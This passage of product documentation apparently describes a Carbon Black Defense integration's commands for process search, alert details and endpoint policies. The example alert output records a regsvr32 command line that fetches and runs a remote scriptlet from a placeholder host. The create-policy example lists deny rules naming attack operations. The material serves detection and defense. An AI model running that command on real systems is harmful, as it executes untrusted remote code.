<td style="width: 542px;">Shows result from this row and after</td>
<td style="width: 542px;"> -</td>
</tr>
<tr>
<td style="width: 161px;">rows</td>
<td style="width: 542px;">Maximum number of rows of result</td>
<td style="width: 542px;"> This parameter can be limited on the Cb Defense server side.</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px; width: 750px;" border="6" cellpadding="2">
<tbody>
<tr>
<td style="width: 409px;"><strong> Path</strong></td>
<td style="width: 193px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.ApplicationName</td>
<td style="width: 193px;">Application name</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.ProcessId</td>
<td style="width: 193px;">Process ID</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.NumEvents</td>
<td style="width: 193px;">Number of events</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.ApplicationPath</td>
<td style="width: 193px;">Application path</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.PrivatePid</td>
<td style="width: 193px;">Private PID</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.Sha256Hash</td>
<td style="width: 193px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 409px;">CarbonBlackDefense.GetProcesses.TotalResults</td>
<td style="width: 193px;">Total results</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-find-processes ipAddress="67.143.208.113" rows=2</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
GetProcesses:[] 3 items
0:{} 6 items
ApplicationName:Google Chrome
ApplicationPath:/Applications/Google Chrome.app/Contents/MacOS/Google Chrome
NumEvents:3580
PrivatePid:81577-1533502547808-202
ProcessId:81577
Sha256Hash:19509e92f048f64692a3bc8786f7e74906541c4b548964c69a22ad9e44e43a2d
1:{} 6 items
ApplicationName:cloud-drive-ui
ApplicationPath:/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui
NumEvents:2038
PrivatePid:1071-1533502548722-245
ProcessId:1071
Sha256Hash:f649ce0c8d5ca63be86e00877632c6390af772eed86c07b3db5b818c30ab700b
2:{} 1 item
TotalResults:2
</pre>
<h5>Human Readable Output</h5>
<table border="2" cellpadding="6">
<thead>
<tr>
<th>ApplicationName</th>
<th>ApplicationPath</th>
<th>NumEvents</th>
<th>PrivatePid</th>
<th>ProcessId</th>
<th>Sha256Hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>Google Chrome</td>
<td>/Applications/Google Chrome.app/Contents/MacOS/Google Chrome</td>
<td>3580</td>
<td>81577-1533502547808-202</td>
<td>81577</td>
<td>19509e92f048f64692a3bc8786f7e74906541c4b548964c69a22ad9e44e43a2d</td>
</tr>
<tr>
<td>cloud-drive-ui</td>
<td>/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui</td>
<td>2038</td>
<td>1071-1533502548722-245</td>
<td>1071</td>
<td>f649ce0c8d5ca63be86e00877632c6390af772eed86c07b3db5b818c30ab700b</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_4112923114161529924434289">Get alert details</h3>
<hr>
<p>Returns the details of a specified alert.</p>
<h5>Base Command</h5>
<p><code>cbd-get-alert-details</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">alertId</td>
<td style="width: 542px;">Alert ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 437px;"><strong> Path</strong></td>
<td style="width: 229px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.DeviceType</td>
<td style="width: 229px;">Device type</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.Group</td>
<td style="width: 229px;">Group</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.GroupId</td>
<td style="width: 229px;">Group ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.RegisteredTime</td>
<td style="width: 229px;">Registered time</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.DeviceId</td>
<td style="width: 229px;">Device ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.DeviceName</td>
<td style="width: 229px;">Device name</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.Status</td>
<td style="width: 229px;">Status</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.OsVersion</td>
<td style="width: 229px;">OS version</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.SensorVersion</td>
<td style="width: 229px;">Sensor version</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.UserName</td>
<td style="width: 229px;">User name</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.Importance</td>
<td style="width: 229px;">Importance</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.Message</td>
<td style="width: 229px;">Message</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.DeviceInfo.Success</td>
<td style="width: 229px;">Success</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ParentHash</td>
<td style="width: 229px;">Parent hash</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.PolicyState</td>
<td style="width: 229px;">Policy state</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.LongDescription</td>
<td style="width: 229px;">Long description</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ParentPid</td>
<td style="width: 229px;">Parent PID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ProcessId</td>
<td style="width: 229px;">Process ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ThreatIndicators</td>
<td style="width: 229px;">Threat indicators</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ApplicationPath</td>
<td style="width: 229px;">Application path</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ProcessHash</td>
<td style="width: 229px;">Process hash</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ProcessMd5Hash</td>
<td style="width: 229px;">Process MD5 hash</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.EventId</td>
<td style="width: 229px;">Event ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.EventTime</td>
<td style="width: 229px;">Event time</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.EventType</td>
<td style="width: 229px;">Event type</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.KillChainStatus</td>
<td style="width: 229px;">Kill chain status</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ParentName</td>
<td style="width: 229px;">Parent name</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ParentPPid</td>
<td style="width: 229px;">ParentP PID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.Events.ProcessPPid</td>
<td style="width: 229px;">ProcessP PID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.IncidentId</td>
<td style="width: 229px;">Incident ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.Indicators.ApplicationName</td>
<td style="width: 229px;">Application name</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.Indicators.IndicatorName</td>
<td style="width: 229px;">Indicator name</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.Indicators.Sha256Hash</td>
<td style="width: 229px;">SHA-256 hash</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.Summary</td>
<td style="width: 229px;">Summary</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.ThreatId</td>
<td style="width: 229px;">Threat ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.ThreatScore</td>
<td style="width: 229px;">Threat score</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetAlertDetails.ThreatInfo.Time</td>
<td style="width: 229px;">Time</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-get-alert-details alertId=HWOXYQ6P</code></p>
<h5>Context Example</h5>
<pre>Account:{} 2 items
CarbonBlackDefense:{} 2 items
GetAlertDetails:{} 1 item
DeviceInfo:{} 4 items
DeviceInfo:{} 13 items
DeviceName:ECIADWS7
Success:true
Message:success
RegisteredTime:1525879595477
DeviceType:WINDOWS
DeviceId:896327
Status:REGISTERED
OsVersion:Windows 7 x86 SP: 1
Importance:MEDIUM
UserName:EVILCORP\Expel
GroupId:0
SensorVersion:3.1.0.100
Group:null
Events:{} 17 items
OrgId:1105
ThreatInfo:{} 6 items
IncidentId:HWOXYQ6P
Indicators:{} 3 items
ApplicationName:[] 64 items
IndicatorName:[] 64 items
Sha256Hash:[] 64 items
Summary:The application regsvr32.exe is executing an encoded fileless script.
ThreatId:218c1859d76eb42113590f9da21e2cec
ThreatScore:5
Time:1533253999790
GetProcesses:[] 3 items
0:{} 6 items
ApplicationName:Google Chrome
ApplicationPath:/Applications/Google Chrome.app/Contents/MacOS/Google Chrome
NumEvents:3580
PrivatePid:81577-1533502547808-202
ProcessId:81577
Sha256Hash:19509e92f048f64692a3bc8786f7e74906541c4b548964c69a22ad9e44e43a2d
1:{} 6 items
ApplicationName:cloud-drive-ui
ApplicationPath:/Users/cberninger/.CloudStation/CloudStation.app/Contents/MacOS/cloud-drive-ui
NumEvents:2038
PrivatePid:1071-1533502548722-245
ProcessId:1071
Sha256Hash:f649ce0c8d5ca63be86e00877632c6390af772eed86c07b3db5b818c30ab700b
2:{} 1 item
TotalResults:2
Endpoint:{} 2 items
Hostname:ECIADWS7
OS:WINDOWS
Process:{} 7 items
CommandLine:regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll
Endpoint:ECIADWS7
MD5:432be6cf7311062633459eef6b242fb5
PID:12804
ParentID:10808
ParentName:alert_generator.bat
Path:C:\Windows\System32\regsvr32.exe
</pre>
<p> </p>
<h3 id="h_1829682194811529924442623">Get all policy details.</h3>
<hr>
<p>Returns the details of all policies. the details</p>
<h5>Base Command</h5>
<p><code>cbd-get-policies</code></p>
<h5>Input</h5>
<p>There is no input for this command.</p>
<h5>Context Output</h5>
<table style="height: 182px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 437px;"><strong> Path</strong></td>
<td style="width: 229px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicies.Id</td>
<td style="width: 229px;">The policy ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicies.PriorityLevel</td>
<td style="width: 229px;">The policy's priority level</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicies.SystemPolicy</td>
<td style="width: 229px;">System policy (<strong>boolean</strong>)</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicies.LatestRevision</td>
<td style="width: 229px;">The policy's latest revision</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicies.Policy</td>
<td style="width: 229px;">The policy object</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-get-policies</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
GetPolicies:[] 40 items
0:{} 5 items
Id:6525
LatestRevision:1488926710902
Policy:{} 6 items
avSettings:{} 6 items
apc:{} 4 items
enabled:false
maxExeDelay:45
maxFileSize:4
riskLevel:4
features:[] 3 items
0:{} 2 items
enabled:false
name:SIGNATURE_UPDATE
1:{} 2 items
enabled:false
name:ONACCESS_SCAN
2:{} 2 items
enabled:true
name:ONDEMAND_SCAN
onAccessScan:{} 1 item
profile:NORMAL
onDemandScan:{} 4 items
profile:NORMAL
scanCdDvd:AUTOSCAN
scanUsb:AUTOSCAN
schedule:{} 4 items
days:null
rangeHours:0
recoveryScanIfMissed:true
startHour:0
signatureUpdate:{} 1 item
schedule:{} 3 items
fullIntervalHours:0
initialRandomDelayHours:4
intervalHours:4
updateServers:{} 2 items
servers:[] 1 item
0:{} 3 items
flags:0
regId:null
server:[] 1 item
0:http://updates.cdc.carbonblack.io/update
serversForOffSiteDevices:[] 1 item
0:http://updates.cdc.carbonblack.io/update
directoryActionRules:[] 0 items
id:-1
knownBadHashAutoDeleteDelayMs:null
rules:[] 0 items
sensorSettings:[] 24 items
0:{} 2 items
name:ALLOW_UNINSTALL
value:true
1:{} 2 items
name:ALLOW_UPLOADS
value:false
2:{} 2 items
name:SHOW_UI
value:false
3:{} 2 items
name:ENABLE_THREAT_SHARING
value:true
4:{} 2 items
name:QUARANTINE_DEVICE
value:false
5:{} 2 items
name:LOGGING_LEVEL
value:NORMAL
6:{} 2 items
name:QUARANTINE_DEVICE_MESSAGE
value:Your device has been quarantined. Please contact your administrator.
7:{} 2 items
name:SET_SENSOR_MODE
value:0
8:{} 2 items
name:SENSOR_RESET
value:0
9:{} 2 items
name:BACKGROUND_SCAN
value:false
10:{} 2 items
name:POLICY_ACTION_OVERRIDE
value:true
11:{} 2 items
name:HELP_MESSAGE
value:
12:{} 2 items
name:PRESERVE_SYSTEM_MEMORY_SCAN
value:false
13:{} 2 items
name:HASH_MD5
value:false
14:{} 2 items
name:SCAN_LARGE_FILE_READ
value:false
15:{} 2 items
name:SCAN_EXECUTE_ON_NETWORK_DRIVE
value:false
16:{} 2 items
name:DELAY_EXECUTE
value:false
17:{} 2 items
name:SCAN_NETWORK_DRIVE
value:false
18:{} 2 items
name:BYPASS_AFTER_LOGIN_MINS
value:0
19:{} 2 items
name:BYPASS_AFTER_RESTART_MINS
value:0
20:{} 2 items
name:SHOW_FULL_UI
value:false
21:{} 2 items
name:SECURITY_CENTER_OPT
value:false
22:{} 2 items
name:CB_LIVE_RESPONSE
value:false
23:{} 2 items
name:UNINSTALL_CODE
value:false
PriorityLevel:MEDIUM
SystemPolicy:true
</pre>
<p> </p>
<h3 id="h_8669376925451529924450795">Get the details of a specified policy</h3>
<hr>
<p>Returns the details of a specified policy.</p>
<h5>Base Command</h5>
<p><code>cbd-get-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">policyId</td>
<td style="width: 542px;">Policy ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 182px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 437px;"><strong> Path</strong></td>
<td style="width: 229px;"> <strong>Description</strong>
</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicy.Id</td>
<td style="width: 229px;">The policy ID</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicy.PriorityLevel</td>
<td style="width: 229px;">The policy's priority level</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicy.SystemPolicy</td>
<td style="width: 229px;">System policy (<strong>boolean</strong>)</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicy.LatestRevision</td>
<td style="width: 229px;">The policy's latest revision</td>
</tr>
<tr>
<td style="width: 437px;">CarbonBlackDefense.GetPolicy.Policy</td>
<td style="width: 229px;">The policy object</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-get-policy policyId=6525</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
GetPolicy:{} 5 items
Id:6525
LatestRevision:1488926710902
Policy:{} 6 items
avSettings:{} 6 items
apc:{} 4 items
enabled:false
maxExeDelay:45
maxFileSize:4
riskLevel:4
features:[] 3 items
0:{} 2 items
enabled:false
name:SIGNATURE_UPDATE
1:{} 2 items
enabled:false
name:ONACCESS_SCAN
2:{} 2 items
enabled:true
name:ONDEMAND_SCAN
onAccessScan:{} 1 item
profile:NORMAL
onDemandScan:{} 4 items
profile:NORMAL
scanCdDvd:AUTOSCAN
scanUsb:AUTOSCAN
schedule:{} 4 items
days:null
rangeHours:0
recoveryScanIfMissed:true
startHour:0
signatureUpdate:{} 1 item
schedule:{} 3 items
fullIntervalHours:0
initialRandomDelayHours:4
intervalHours:4
updateServers:{} 2 items
servers:[] 1 item
0:{} 3 items
flags:0
regId:null
server:[] 1 item
0:http://updates.cdc.carbonblack.io/update
serversForOffSiteDevices:[] 1 item
0:http://updates.cdc.carbonblack.io/update
directoryActionRules:[] 0 items
id:-1
knownBadHashAutoDeleteDelayMs:null
rules:[] 0 items
sensorSettings:[] 24 items
0:{} 2 items
name:ALLOW_UNINSTALL
value:true
1:{} 2 items
name:ALLOW_UPLOADS
value:false
2:{} 2 items
name:SHOW_UI
value:false
3:{} 2 items
name:ENABLE_THREAT_SHARING
value:true
4:{} 2 items
name:QUARANTINE_DEVICE
value:false
5:{} 2 items
name:LOGGING_LEVEL
value:NORMAL
6:{} 2 items
name:QUARANTINE_DEVICE_MESSAGE
value:Your device has been quarantined. Please contact your administrator.
7:{} 2 items
name:SET_SENSOR_MODE
value:0
8:{} 2 items
name:SENSOR_RESET
value:0
9:{} 2 items
name:BACKGROUND_SCAN
value:false
10:{} 2 items
name:POLICY_ACTION_OVERRIDE
value:true
11:{} 2 items
name:HELP_MESSAGE
value:
12:{} 2 items
name:PRESERVE_SYSTEM_MEMORY_SCAN
value:false
13:{} 2 items
name:HASH_MD5
value:false
14:{} 2 items
name:SCAN_LARGE_FILE_READ
value:false
15:{} 2 items
name:SCAN_EXECUTE_ON_NETWORK_DRIVE
value:false
16:{} 2 items
name:DELAY_EXECUTE
value:false
17:{} 2 items
name:SCAN_NETWORK_DRIVE
value:false
18:{} 2 items
name:BYPASS_AFTER_LOGIN_MINS
value:0
19:{} 2 items
name:BYPASS_AFTER_RESTART_MINS
value:0
20:{} 2 items
name:SHOW_FULL_UI
value:false
21:{} 2 items
name:SECURITY_CENTER_OPT
value:false
22:{} 2 items
name:CB_LIVE_RESPONSE
value:false
23:{} 2 items
name:UNINSTALL_CODE
value:false
PriorityLevel:MEDIUM
SystemPolicy:true
</pre>
<h5>Human Readable Output</h5>
<table style="width: 1109px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 109px;">Id</th>
<th style="width: 973px;">6525</th>
</tr>
</thead>
<tbody>
<tr>
<td style="width: 109px;">LatestRevision</td>
<td style="width: 973px;">1488926710902</td>
</tr>
<tr>
<td style="width: 109px;">Policy</td>
<td style="width: 973px;">{"rules":[],"id":-1,"sensorSettings":[{"name":"ALLOW_UNINSTALL","value":"true"},{"name":"ALLOW_UPLOADS","value":"false"},{"name":"SHOW_UI","value":"false"},{"name":"ENABLE_THREAT_SHARING","value":"true"},{"name":"QUARANTINE_DEVICE","value":"false"},{"name":"LOGGING_LEVEL","value":"NORMAL"},{"name":"QUARANTINE_DEVICE_MESSAGE","value":"Your device has been quarantined. Please contact your administrator."},{"name":"SET_SENSOR_MODE","value":"0"},{"name":"SENSOR_RESET","value":"0"},{"name":"BACKGROUND_SCAN","value":"false"},{"name":"POLICY_ACTION_OVERRIDE","value":"true"},{"name":"HELP_MESSAGE","value":""},{"name":"PRESERVE_SYSTEM_MEMORY_SCAN","value":"false"},{"name":"HASH_MD5","value":"false"},{"name":"SCAN_LARGE_FILE_READ","value":"false"},{"name":"SCAN_EXECUTE_ON_NETWORK_DRIVE","value":"false"},{"name":"DELAY_EXECUTE","value":"false"},{"name":"SCAN_NETWORK_DRIVE","value":"false"},{"name":"BYPASS_AFTER_LOGIN_MINS","value":"0"},{"name":"BYPASS_AFTER_RESTART_MINS","value":"0"},{"name":"SHO ...http://updates.cdc.carbonblack.io/update"],"servers":[{"server":["http://updates.cdc.carbonblack.io/update"],"flags":0,"regId":null}]},"apc":{"maxFileSize":4,"maxExeDelay":45,"riskLevel":4,"enabled":false},"onAccessScan":{"profile":"NORMAL"},"onDemandScan":{"profile":"NORMAL","scanCdDvd":"AUTOSCAN","scanUsb":"AUTOSCAN","schedule":{"days":null,"rangeHours":0,"startHour":0,"recoveryScanIfMissed":true}},"signatureUpdate":{"schedule":{"intervalHours":4,"fullIntervalHours":0,"initialRandomDelayHours":4}}},"knownBadHashAutoDeleteDelayMs":null,"directoryActionRules":[]}</td>
</tr>
<tr>
<td style="width: 109px;">PriorityLevel</td>
<td style="width: 973px;">MEDIUM</td>
</tr>
<tr>
<td style="width: 109px;">SystemPolicy</td>
<td style="width: 973px;">true</td>
</tr>
</tbody>
</table>
<p> </p>
<h3 id="h_1295394126081529924459791">Create a policy</h3>
<hr>
<p>Creates a policy, as prescribed by further input.</p>
<h5>Base Command</h5>
<p><code>cbd-create-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">description</td>
<td style="width: 542px;">Policy description</td>
</tr>
<tr>
<td style="width: 161px;">name</td>
<td style="width: 542px;">A single line name for the policy</td>
</tr>
<tr>
<td style="width: 161px;">priorityLevel</td>
<td style="width: 542px;">Priority score associated with sensors assigned to this policy</td>
</tr>
<tr>
<td style="width: 161px;">policy</td>
<td style="width: 542px;">
<p>JSON object containing the policy details.</p>
<p>Make sure a valid policy object is passed:</p>
<ol>
<li>Use the <code>get-policy</code> command to retrieve a similar policy object.</li>
<li>Use the <code style="font-size: 14px;">set-policy</code> command to re-set some of the policy's fields.</li>
<li>Use the modified object.</li>
</ol>
</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Context Output</h5>
<table style="height: 75px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr style="height: 19.6719px;">
<td style="width: 376px; height: 19.6719px;"><strong> Path</strong></td>
<td style="width: 172px; height: 19.6719px;"> <strong>Description</strong>
</td>
</tr>
<tr style="height: 18px;">
<td style="width: 376px; height: 18px;">CarbonBlackDefense.CreatePolicy.PolicyId</td>
<td style="width: 172px; height: 18px;">The new policy ID</td>
</tr>
</tbody>
</table>
<p> </p>
<h5>Command Example</h5>
<p><code>!cbd-create-policy priorityLevel=LOW name=YARDENTEST3 description=yardentesttest3 policy={ "policyInfo": { "description": "test policy for documentation", "name": "documentation test", "policy": { "avSettings": { "apc": { "enabled": false, "maxExeDelay": 45, "maxFileSize": 4, "riskLevel": 4 }, "features": [ { "enabled": false, "name": "SIGNATURE_UPDATE" }, { "enabled": true, "name": "ONACCESS_SCAN" }, { "enabled": true, "name": "ONDEMAND_SCAN" } ], "onAccessScan": { "profile": "NORMAL" }, "onDemandScan": { "profile": "NORMAL", "scanCdDvd": "AUTOSCAN", "scanUsb": "AUTOSCAN", "schedule": { "days": null, "rangeHours": 0, "recoveryScanIfMissed": true, "startHour": 0 } }, "signatureUpdate": { "schedule": { "fullIntervalHours": 0, "initialRandomDelayHours": 4, "intervalHours": 2 } }, "updateServers": { "servers": [ { "flags": 0, "regId": null, "server": [ "http://updates.cdc.carbonblack.io/update" ] } ], "serversForOffSiteDevices": [ "http://updates.cdc.carbonblack.io/update" ] } }, "directoryActionRules": [ { "actions": { "FILE_UPLOAD": false, "PROTECTION": false }, "path": "C:\\FXCM\\**" }, { "actions": { "FILE_UPLOAD": true, "PROTECTION": false }, "path": "sadf" }, { "actions": { "FILE_UPLOAD": true, "PROTECTION": false }, "path": "/Users/**" } ], "id": -1, "rules": [ { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 1, "operation": "RUN", "required": true }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "COMPANY_BLACK_LIST" }, "id": 2, "operation": "RUN", "required": true }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 3, "operation": "NETWORK", "required": false }, { "action": "TERMINATE", "application": { "type": "REPUTATION", "value": "ADAPTIVE_WHITE_LIST" }, "id": 5, "operation": "RANSOM", "required": false }, { "action": "IGNORE", "application": { "type": "NAME_PATH", "value": "**\\devenv.exe" }, "id": 4, "operation": "RANSOM", "required": false }, { "action": "DENY", "application": { "type": "NAME_PATH", "value": "%SystemDrive%\\Windows\\System32\\notepad2.exe" }, "id": 10, "operation": "RUN", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 11, "operation": "RANSOM", "required": true }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 13, "operation": "MEMORY_SCRAPE", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 14, "operation": "CODE_INJECTION", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 15, "operation": "RUN_INMEMORY_CODE", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 17, "operation": "POL_INVOKE_NOT_TRUSTED", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 18, "operation": "INVOKE_CMD_INTERPRETER", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "KNOWN_MALWARE" }, "id": 20, "operation": "INVOKE_SCRIPT", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "RESOLVING" }, "id": 22, "operation": "RUN", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "PUP" }, "id": 23, "operation": "RUN", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "SUSPECT_MALWARE" }, "id": 24, "operation": "RUN", "required": false }, { "action": "DENY", "application": { "type": "REPUTATION", "value": "ADAPTIVE_WHITE_LIST" }, "id": 25, "operation": "NETWORK", "required": false }, { "action": "ALLOW", "application": { "type": "NAME_PATH", "value": "c:\\test\\**" }, "id": 26, "operation": "INVOKE_SCRIPT", "required": false } ], "sensorSettings": [ { "name": "SHOW_UI", "value": "true" }, { "name": "BACKGROUND_SCAN", "value": "true" }, { "name": "POLICY_ACTION_OVERRIDE", "value": "true" }, { "name": "QUARANTINE_DEVICE_MESSAGE", "value": "Your device has been quarantined by your computer administrator." }, { "name": "LOGGING_LEVEL", "value": "false" }, { "name": "ALLOW_UNINSTALL", "value": "true" }, { "name": "QUARANTINE_DEVICE", "value": "false" }, { "name": "RATE_LIMIT", "value": "0" }, { "name": "CONNECTION_LIMIT", "value": "0" }, { "name": "QUEUE_SIZE", "value": "100" }, { "name": "LEARNING_MODE", "value": "0" }, { "name": "SCAN_NETWORK_DRIVE", "value": "true" }, { "name": "BYPASS_AFTER_LOGIN_MINS", "value": "0" }, { "name": "BYPASS_AFTER_RESTART_MINS", "value": "0" }, { "name": "SCAN_EXECUTE_ON_NETWORK_DRIVE", "value": "true" }, { "name": "DELAY_EXECUTE", "value": "true" }, { "name": "PRESERVE_SYSTEM_MEMORY_SCAN", "value": "false" }, { "name": "HASH_MD5", "value": "false" }, { "name": "SCAN_LARGE_FILE_READ", "value": "false" }, { "name": "SHOW_FULL_UI", "value": "true" }, { "name": "HELP_MESSAGE", "value": "CarbonBlack" }, { "name": "SECURITY_CENTER_OPT", "value": "true" }, { "name": "CB_LIVE_RESPONSE", "value": "true" }, { "name": "UNINSTALL_CODE", "value": "false" } ] }, "priorityLevel": "LOW", "version": 2 } }</code></p>
<h5>Context Example</h5>
<pre>CarbonBlackDefense:{} 1 item
CreatePolicy:{} 1 item
PolicyId:21356
</pre>
<h5>Human Readable Output</h5>
<table style="width: 142px;" border="2" cellpadding="6">
<thead>
<tr>
<th style="width: 57px;">PolicyId</th>
<th style="width: 58px;">21356</th>
</tr>
</thead>
</table>
<p> </p>
<h3 id="h_3776007306701529924469385">Update a policy</h3>
<hr>
<p>Updates an existing policy.</p>
<h5>Base Command</h5>
<p><code>cbd-update-policy</code></p>
<h5>Input</h5>
<table style="height: 102px; width: 750px;" border="2" cellpadding="6">
<tbody>
<tr>
<td style="width: 161px;"><strong>Parameter</strong></td>
<td style="width: 542px;"><strong>Description</strong></td>
</tr>
<tr>
<td style="width: 161px;">description</td>
<td style="width: 542px;">Policy description</td>
</tr>
<tr>
